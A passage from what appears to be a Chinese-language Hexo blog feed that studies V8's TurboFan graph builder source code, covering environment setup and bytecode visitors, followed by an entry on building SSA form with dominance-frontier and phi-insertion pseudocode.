class="keyword">int</span> register_base_;</span><br><span class="line">  <span class="keyword">int</span> accumulator_base_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>从上面可知，values()返回一个NodeVector values_。<br>然后继续看env的初始化<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  Environment env(this, bytecode_array()-&gt;register_count(),</span><br><span class="line">                  bytecode_array()-&gt;parameter_count(),</span><br><span class="line">                  bytecode_array()-&gt;incoming_new_target_or_generator_register(),</span><br><span class="line">                  graph()-&gt;start());</span><br><span class="line">  set_environment(&amp;env);</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  BytecodeGraphBuilder::Environment::Environment(</span><br><span class="line">    BytecodeGraphBuilder* builder, <span class="keyword">int</span> register_count, <span class="keyword">int</span> parameter_count,</span><br><span class="line">    interpreter::Register incoming_new_target_or_generator,</span><br><span class="line">    Node* control_dependency)</span><br><span class="line">    : builder_(builder),</span><br><span class="line">      register_count_(register_count),</span><br><span class="line">      parameter_count_(parameter_count),</span><br><span class="line">      control_dependency_(control_dependency),</span><br><span class="line">      effect_dependency_(control_dependency),</span><br><span class="line">      values_(builder-&gt;local_zone()),</span><br><span class="line">      parameters_state_values_(<span class="literal">nullptr</span>),</span><br><span class="line">      generator_state_(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">  <span class="comment">// The layout of values_ is:</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// [receiver] [parameters] [registers] [accumulator]</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// parameter[0] is the receiver (this), parameters 1..N are the</span></span><br><span class="line">  <span class="comment">// parameters supplied to the method (arg0..argN-1). The accumulator</span></span><br><span class="line">  <span class="comment">// is stored separately.</span></span><br><span class="line">  <span class="comment">// Parameters including the receiver</span></span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>注意这句话</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parameter[0] is the receiver (this), parameters 1..N are the</span><br><span class="line">Parameters including the receiver</span><br></pre></td></tr></table></figure></p><p>首先创建parameter节点，Start作为parameter的input节点。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; parameter_count; i++) &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">const</span> Operator* op = common()-&gt;Parameter(i, debug_name);</span><br><span class="line">  Node* parameter = builder-&gt;graph()-&gt;NewNode(op, graph()-&gt;start());</span><br><span class="line">  values()-&gt;push_back(parameter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后向values_这个NodeVector的end之前，插入register_count个值为undefined_constant的Node节点。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Registers</span></span><br><span class="line">  register_base_ = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(values()-&gt;size());</span><br><span class="line">  Node* undefined_constant = builder-&gt;jsgraph()-&gt;UndefinedConstant();</span><br><span class="line">  values()-&gt;insert(values()-&gt;end(), register_count, undefined_constant);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">DEFINE_GETTER(UndefinedConstant, HeapConstant(factory()-&gt;undefined_value()))</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="comment">// valuev8::internal::Handle&lt;v8::internal::HeapObject&gt;</span></span><br><span class="line">Node* JSGraph::HeapConstant(Handle&lt;HeapObject&gt; value) &#123;</span><br><span class="line">  Node** loc = cache_.FindHeapConstant(value);</span><br><span class="line">  <span class="keyword">if</span> (*loc == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    *loc = graph()-&gt;NewNode(common()-&gt;HeapConstant(value));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> *loc;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">const</span> Operator* CommonOperatorBuilder::HeapConstant(</span><br><span class="line">    <span class="keyword">const</span> Handle&lt;HeapObject&gt;&amp; value) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;Handle&lt;HeapObject&gt;&gt;(  <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kHeapConstant, Operator::kPure,       <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"HeapConstant"</span>,                                 <span class="comment">// name</span></span><br><span class="line">      <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,                               <span class="comment">// counts</span></span><br><span class="line">      value);                                         <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>先从cache中检查是否已经有HeapConstant,如果没有就新建再返回，如果有就直接返回cache里的。</p><p>然后再向value_的最后插入一个undefined_constant节点作为Accumulator。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Accumulator</span></span><br><span class="line">accumulator_base_ = <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(values()-&gt;size());</span><br><span class="line">values()-&gt;push_back(undefined_constant);</span><br></pre></td></tr></table></figure></p><p>然后设置Context<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// Context</span></span><br><span class="line">  <span class="keyword">int</span> context_index = Linkage::GetJSCallContextParamIndex(parameter_count);</span><br><span class="line">  <span class="keyword">const</span> Operator* op = common()-&gt;Parameter(context_index, <span class="string">"%context"</span>);</span><br><span class="line">  context_ = builder-&gt;graph()-&gt;NewNode(op, graph()-&gt;start());</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">    <span class="comment">// A special &#123;Parameter&#125; index for JSCalls that represents the context.</span></span><br><span class="line">  <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">GetJSCallContextParamIndex</span><span class="params">(<span class="keyword">int</span> parameter_count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> parameter_count + <span class="number">2</span>;  <span class="comment">// Parameter (arity + 2) is special.</span></span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">const</span> Operator* CommonOperatorBuilder::Parameter(<span class="keyword">int</span> index,</span><br><span class="line">                                                 <span class="keyword">const</span> <span class="keyword">char</span>* debug_name) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!debug_name) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (index) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CACHED_PARAMETER(index) \</span></span><br><span class="line">  <span class="keyword">case</span> index:                   \</span><br><span class="line">    <span class="keyword">return</span> &amp;cache_.kParameter##index##Operator;</span><br><span class="line">      CACHED_PARAMETER_LIST(CACHED_PARAMETER)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> CACHED_PARAMETER</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// Uncached.</span></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;ParameterInfo&gt;(  <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kParameter, Operator::kPure,     <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"Parameter"</span>,                               <span class="comment">// name</span></span><br><span class="line">      <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>,                          <span class="comment">// counts</span></span><br><span class="line">      ParameterInfo(index, debug_name));         <span class="comment">// parameter info</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><em>context也创建了一个parameter的node，用来做什么的我还没看懂，可能需要好好看看log或者compiler/linkage.h这个文件</em></p><h4 id="VisitBytecodes"><a href="#VisitBytecodes" class="headerlink" title="VisitBytecodes"></a>VisitBytecodes</h4><p>V8准备一个称为v8::internal::AstVisitor的基类，简称AstVisitor，从AST生成bytecode。<br>AstVisitor是一个使用Vistor模式的类。<br>在深度优先搜索AST时调用相应的回调函数。<br>生成的bytecode存放在bytecode数组当中，用Javascript来模拟这个结构，看起来像这样。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-06-090746.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-06-090832.jpg" alt=""><br>当然这个并不重要，回顾一下而已。</p><p>VisitBytecodes首先进行bytecode_analysis，在这里面进行包括liveness分析等。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">BytecodeAnalysis bytecode_analysis(bytecode_array(), local_zone(),</span><br><span class="line">                                   analyze_environment_liveness());</span><br><span class="line">bytecode_analysis.Analyze(osr_offset_);</span><br><span class="line">set_bytecode_analysis(&amp;bytecode_analysis);</span><br><span class="line"></span><br><span class="line">interpreter::BytecodeArrayIterator iterator(bytecode_array());</span><br><span class="line">set_bytecode_iterator(&amp;iterator);</span><br><span class="line"><span class="function">SourcePositionTableIterator <span class="title">source_position_iterator</span><span class="params">(</span></span></span><br><span class="line">    handle(bytecode_array()-&gt;SourcePositionTable()));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (analyze_environment_liveness() &amp;&amp; FLAG_trace_environment_liveness) &#123;</span><br><span class="line">  <span class="function">OFStream <span class="title">of</span><span class="params">(<span class="built_in">stdout</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  bytecode_analysis.PrintLivenessTo(of);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果想观察liveness过程，可以启用这个flag<br><code>DEFINE_BOOL(trace_environment_liveness, false,            &quot;trace liveness of local variable slots&quot;)</code></p><p>bytecode_array被设置迭代，然后通过VisitSingleBytecode一个个处理。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (; !iterator.done(); iterator.Advance()) &#123;</span><br><span class="line">  VisitSingleBytecode(&amp;source_position_iterator);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这个函数前面就是一些获取bytecode并偏移寻找下一个还有一些其他判断，主要的内容其实是这个大的switch case，对不同bytecode进行不同处理。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">switch</span> (iterator.current_bytecode()) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BYTECODE_CASE(name, ...)       \</span></span><br><span class="line">  <span class="keyword">case</span> interpreter::Bytecode::k#<span class="meta">#name: \</span></span><br><span class="line">    Visit#<span class="meta">#name();                     \</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">      BYTECODE_LIST(BYTECODE_CASE)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> BYTECODE_CODE</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>BYTECODE_LIST在bytecode.h里，太长了就不列了。</p><p>VisitSingleBytecode里有很多分支，我捡一些写一下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[generated bytecode for function: foo]</span><br><span class="line">Parameter count 2</span><br><span class="line">Frame size 24</span><br><span class="line">   80 E&gt; 0x186d973a4f8a @    0 : a0                StackCheck</span><br><span class="line">   97 S&gt; 0x186d973a4f8b @    1 : 28 02 00 00       LdaNamedProperty a0, [0], [0]</span><br><span class="line">         0x186d973a4f8f @    5 : 26 fb             Star r0</span><br><span class="line">         0x186d973a4f91 @    7 : 0c 64             LdaSmi [100]</span><br><span class="line">         0x186d973a4f93 @    9 : 26 f9             Star r2</span><br><span class="line">   97 E&gt; 0x186d973a4f95 @   11 : 57 fb 02 f9 02    CallProperty1 r0, a0, r2, [2]</span><br><span class="line">  110 S&gt; 0x186d973a4f9a @   16 : a4                Return</span><br><span class="line">Constant pool (size = 1)</span><br><span class="line">0x186d973a4f19: [FixedArray] in OldSpace</span><br><span class="line"> - map: 0x186d90c023c1 &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 0x186dc2812029 &lt;String[7]: indexOf&gt;</span><br><span class="line">Handler Table (size = 0)</span><br></pre></td></tr></table></figure><ul><li>VisitStackCheck<br>在为StackCheck构建node之前，如果没有一个能够支配（effect-dom)它的checkpoint节点，那么会先创建一个精确的checkpoint节点。<br>于是在PrepareEagerCheckpoint调用<code>Node* node = NewNode(common()-&gt;Checkpoint());</code><br>即使我们在某种情况下跳过了checkpoint的创建，依然会染着Effect边为StackCheck寻找一个能够支配（effect-dom)它的Checkpoint。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V(Checkpoint, Operator::kKontrol, 0, 1, 1, 0, 1, 0)</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> BytecodeGraphBuilder::VisitStackCheck() &#123;</span><br><span class="line">  PrepareEagerCheckpoint();</span><br><span class="line">  Node* node = NewNode(javascript()-&gt;StackCheck());</span><br><span class="line">  environment()-&gt;RecordAfterState(node, Environment::kAttachFrameState);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">void</span> BytecodeGraphBuilder::PrepareEagerCheckpoint() &#123;</span><br><span class="line">  <span class="keyword">if</span> (needs_eager_checkpoint()) &#123;</span><br><span class="line">    <span class="comment">// Create an explicit checkpoint node for before the operation. This only</span></span><br><span class="line">    <span class="comment">// needs to happen if we aren't effect-dominated by a &#123;Checkpoint&#125; already.</span></span><br><span class="line">    mark_as_needing_eager_checkpoint(<span class="literal">false</span>);</span><br><span class="line">    Node* node = NewNode(common()-&gt;Checkpoint());</span><br><span class="line">    DCHECK_EQ(<span class="number">1</span>, OperatorProperties::GetFrameStateInputCount(node-&gt;op()));</span><br><span class="line">    DCHECK_EQ(IrOpcode::kDead,</span><br><span class="line">              NodeProperties::GetFrameStateInput(node)-&gt;opcode());</span><br><span class="line">    BailoutId bailout_id(bytecode_iterator().current_offset());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> BytecodeLivenessState* liveness_before =</span><br><span class="line">        bytecode_analysis()-&gt;GetInLivenessFor(</span><br><span class="line">            bytecode_iterator().current_offset());</span><br><span class="line"></span><br><span class="line">    Node* frame_state_before = environment()-&gt;Checkpoint(</span><br><span class="line">        bailout_id, OutputFrameStateCombine::Ignore(), liveness_before);</span><br><span class="line">    NodeProperties::ReplaceFrameStateInput(node, frame_state_before);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// In case we skipped checkpoint creation above, we must be able to find an</span></span><br><span class="line">    <span class="comment">// existing checkpoint that effect-dominates the nodes about to be created.</span></span><br><span class="line">    <span class="comment">// Starting a search from the current effect-dependency has to succeed.</span></span><br><span class="line">    Node* effect = environment()-&gt;GetEffectDependency();</span><br><span class="line">    <span class="keyword">while</span> (effect-&gt;opcode() != IrOpcode::kCheckpoint) &#123;</span><br><span class="line">      DCHECK(effect-&gt;op()-&gt;HasProperty(Operator::kNoWrite));</span><br><span class="line">      DCHECK_EQ(<span class="number">1</span>, effect-&gt;op()-&gt;EffectInputCount());</span><br><span class="line">      effect = NodeProperties::GetEffectInput(effect);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ul><li><p>VisitLdaNamedProperty</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Operator* JSOperatorBuilder::LoadNamed(Handle&lt;Name&gt; name,</span><br><span class="line">                                             <span class="keyword">const</span> VectorSlotPair&amp; feedback) &#123;</span><br><span class="line">  <span class="function">NamedAccess <span class="title">access</span><span class="params">(LanguageMode::kSloppy, name, feedback)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;NamedAccess&gt;(           <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kJSLoadNamed, Operator::kNoProperties,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"JSLoadNamed"</span>,                                    <span class="comment">// name</span></span><br><span class="line">      <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>,                                 <span class="comment">// counts</span></span><br><span class="line">      access);                                          <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>VisitStar</p></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> BytecodeGraphBuilder::BuildCall(ConvertReceiverMode receiver_mode,</span><br><span class="line">                                     Node* <span class="keyword">const</span>* args, <span class="keyword">size_t</span> arg_count,</span><br><span class="line">                                     <span class="keyword">int</span> slot_id) &#123;</span><br><span class="line">  DCHECK_EQ(interpreter::Bytecodes::GetReceiverMode(</span><br><span class="line">                bytecode_iterator().current_bytecode()),</span><br><span class="line">            receiver_mode);</span><br><span class="line">  PrepareEagerCheckpoint();</span><br><span class="line"></span><br><span class="line">  VectorSlotPair feedback = CreateVectorSlotPair(slot_id);</span><br><span class="line"></span><br><span class="line">  CallFrequency frequency = ComputeCallFrequency(slot_id);</span><br><span class="line">  <span class="keyword">const</span> Operator* op =</span><br><span class="line">      javascript()-&gt;Call(arg_count, frequency, feedback, receiver_mode,</span><br><span class="line">                         GetSpeculationMode(slot_id));</span><br><span class="line">  JSTypeHintLowering::LoweringResult lowering = TryBuildSimplifiedCall(</span><br><span class="line">      op, args, <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(arg_count), feedback.slot());</span><br><span class="line">  <span class="keyword">if</span> (lowering.IsExit()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  Node* node = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (lowering.IsSideEffectFree()) &#123;</span><br><span class="line">    node = lowering.value();</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    DCHECK(!lowering.Changed());</span><br><span class="line">    node = ProcessCallArguments(op, args, <span class="keyword">static_cast</span>&lt;<span class="keyword">int</span>&gt;(arg_count));</span><br><span class="line">  &#125;</span><br><span class="line">  environment()-&gt;BindAccumulator(node, Environment::kAttachFrameState);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">const</span> Operator* JSOperatorBuilder::Call(<span class="keyword">size_t</span> arity, CallFrequency frequency,</span><br><span class="line">                                        VectorSlotPair <span class="keyword">const</span>&amp; feedback,</span><br><span class="line">                                        ConvertReceiverMode convert_mode,</span><br><span class="line">                                        SpeculationMode speculation_mode) &#123;</span><br><span class="line">  DCHECK_IMPLIES(speculation_mode == SpeculationMode::kAllowSpeculation,</span><br><span class="line">                 feedback.IsValid());</span><br><span class="line">  <span class="function">CallParameters <span class="title">parameters</span><span class="params">(arity, frequency, feedback, convert_mode,</span></span></span><br><span class="line"><span class="function"><span class="params">                            speculation_mode)</span></span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator1&lt;CallParameters&gt;(   <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kJSCall, Operator::kNoProperties,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"JSCall"</span>,                                    <span class="comment">// name</span></span><br><span class="line">      parameters.arity(), <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>,           <span class="comment">// inputs/outputs</span></span><br><span class="line">      parameters);                                 <span class="comment">// parameter</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Building SSA Form</title>
      <link href="/2018/09/02/ssa/"/>
      <url>/2018/09/02/ssa/</url>
      <content type="html"><![CDATA[<ol><li>计算Dominator tree<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-02-122833.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-02-122907.jpg" alt=""></li><li>计算控制边界<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for all nodes, n, in the CFG</span><br><span class="line">    DF(n) &lt;- NULL</span><br><span class="line">for all nodes, n, in the CFG</span><br><span class="line">    if n has multiple predecessors then//必须有2个或2个以上的predecessors</span><br><span class="line">        for each predecessor p of n</span><br><span class="line">            runner &lt;- p</span><br><span class="line">            while runner != IDom(n)</span><br><span class="line">                DF(runner) &lt;- DF(runner) U &#123;n&#125;</span><br><span class="line">                runner &lt;- IDom(runner)</span><br></pre></td></tr></table></figure></li></ol><p>举例如下：<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061548.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061607.png" alt=""><br>最后得到Dominance Frontiers<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061622.png" alt=""></p><p><strong>对于n的定义语句可以放置一个PHI函数在m处，如果</strong><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-061753.png" alt=""></p><ol><li>插入PHI函数<br>在真正插入PHI函数之前，我们需要在Dominance Frontiers的基础上，更精确的找到需要PHI函数的地方。</li></ol><p>“The basic idea is simple. A definition of x in block b forces a ϕ-function at every node in df(b).<br>Since that ϕ-function is a new definition of x, it may, in turn, force the insertion of additional ϕ-functions.”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">for each name x∈ Globals</span><br><span class="line">    WorkList &lt;- Blocks(x)</span><br><span class="line">    for each block b∈ WorkList</span><br><span class="line">        for each block d in DF(b)</span><br><span class="line">            if d has no PHI function for x then </span><br><span class="line">                insert a PHI function for x in d</span><br><span class="line">                WorkList &lt;- WorkList U &#123;d&#125;</span><br></pre></td></tr></table></figure><p>对于每个global name x，算法将WorkList初始化为Blocks(x)。<br>对于WorkList上的每个block b，算法在b的支配边界(DF(b))中每个block d的起始处插入PHI函数。<br><strong>在向d中添加对应于x的PHI函数之后，算法将d添加到WorkList，以反映d中对x的新赋值操作</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-072211.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-09-03-072226.png" alt=""></p><ol><li>重命名变量的名字，满足SSA规则</li></ol>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v8 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>v8 GC</title>
      <link href="/2018/09/01/v8_GC/"/>
      <url>/2018/09/01/v8_GC/</url>
